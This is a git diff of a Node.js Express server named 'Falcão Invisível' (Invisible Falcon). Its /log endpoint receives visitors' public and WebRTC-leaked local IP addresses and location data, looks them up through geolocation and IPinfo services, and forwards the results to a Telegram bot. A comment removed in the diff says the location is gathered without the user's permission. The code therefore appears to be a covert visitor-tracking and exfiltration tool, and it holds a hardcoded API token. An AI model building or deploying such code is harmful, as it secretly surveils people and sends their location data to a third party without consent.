@@ -4,7 +4,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis do ambiente (.env ou Render dashboard)
+// Variáveis de ambiente (Render ou .env local)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
@@ -17,8 +17,9 @@ app.get('/', (req, res) => {
 
 app.post('/log', async (req, res) => {
   const data = req.body;
-  console.log("📥 Dados recebidos:", data);
+  console.log("📥 Dados recebidos do front:", data);
 
+  // Confere se o bot está configurado
   if (!botToken || !chatId) {
     console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
     return res.status(500).send("Bot não configurado.");
@@ -27,7 +28,6 @@ app.post('/log', async (req, res) => {
   let preciseLoc = null;
 
   try {
-    // Localização aproximada com base no IP (sem permissão do usuário)
     const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -42,7 +42,6 @@ app.post('/log', async (req, res) => {
   }
 
   try {
-    // Consulta de IP pública (IPinfo)
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
 
@@ -59,6 +58,8 @@ app.post('/log', async (req, res) => {
 🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
 `;
 
+    console.log("🔍 Enviando dados ao Telegram...");
+
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
@@ -70,10 +71,12 @@ app.post('/log', async (req, res) => {
     });
 
     const telegramResult = await telegramRes.json();
+    console.log("📤 RESPOSTA TELEGRAM:", telegramResult);
+
     if (!telegramResult.ok) {
-      console.error("❌ Erro ao enviar pro Telegram:", telegramResult);
+      console.error("❌ Erro ao enviar para o Telegram:", telegramResult.description);
     } else {
-      console.log("✅ Notificação enviada ao Telegram");
+      console.log("✅ Notificação enviada com sucesso!");
     }
 
     res.sendStatus(200);
@@ -84,5 +87,5 @@ app.post('/log', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`🦅 Falcão rodando em: http://localhost:${PORT}`);
+  console.log(`🦅 Falcão Invisível rodando em: http://localhost:${PORT}`);
 });
